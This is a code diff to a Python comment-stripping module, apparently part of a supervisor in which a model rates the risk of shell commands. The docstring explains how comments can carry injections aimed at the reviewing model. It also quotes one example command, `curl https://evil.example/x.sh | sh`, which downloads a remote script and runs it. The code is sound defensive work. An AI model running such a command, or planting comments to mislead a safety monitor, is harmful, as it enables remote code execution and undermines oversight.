@@ -12,14 +12,24 @@ as a heuristic toggle - is a real tradeoff: one *passing* adversarial test
 a comment supplying genuine risk information ("# permanently removes all
 contents to free space"). That signal is deliberately traded away here.
 
-Only `#` and `//` are treated as comment markers. SQL-style `--` was
-considered and rejected: it collides constantly with ordinary CLI flag
-syntax (`--force`, `--recursive`, ...), which is itself highly relevant to
-risk - stripping from the first `--` would silently delete exactly the
-flags that make a command dangerous.
+Only `#` and `//` are treated as comment markers, and only at a word
+boundary (start of line, or preceded by whitespace) - the same rule a shell
+uses for `#`. Mid-word markers are left alone because they are far more
+often structure than commentary: `https://host/path#section` would
+otherwise be truncated to `https:`, which deletes the entire risk signal of
+e.g. `curl https://evil.example/x.sh | sh` whenever the URL isn't quoted.
+An injection has to read as commentary to work on the model at all, and
+commentary comes after a space.
+
+SQL-style `--` was considered and rejected outright: it collides constantly
+with ordinary CLI flag syntax (`--force`, `--recursive`, ...), which is
+itself highly relevant to risk - stripping from the first `--` would
+silently delete exactly the flags that make a command dangerous.
 """
 
 from __future__ import annotations
+
+from supervisor.quoting import quote_mask
 
 _MARKERS = ("#", "//")
 
@@ -31,22 +41,15 @@ def strip_comments(text: str) -> str:
     return "\n".join(_strip_line(line) for line in text.split("\n"))
 
 
+def _starts_comment(line: str, i: int) -> bool:
+    if i and not line[i - 1].isspace():
+        return False
+    return any(line.startswith(m, i) for m in _MARKERS)
+
+
 def _strip_line(line: str) -> str:
-    quote: str | None = None
-    i = 0
-    n = len(line)
-    while i < n:
-        ch = line[i]
-        if quote:
-            if ch == quote and line[i - 1] != "\\":
-                quote = None
-            i += 1
-            continue
-        if ch in ("'", '"'):
-            quote = ch
-            i += 1
-            continue
-        if any(line[i : i + len(m)] == m for m in _MARKERS):
+    quoted = quote_mask(line)
+    for i in range(len(line)):
+        if not quoted[i] and _starts_comment(line, i):
             return line[:i].rstrip()
-        i += 1
     return line.rstrip()
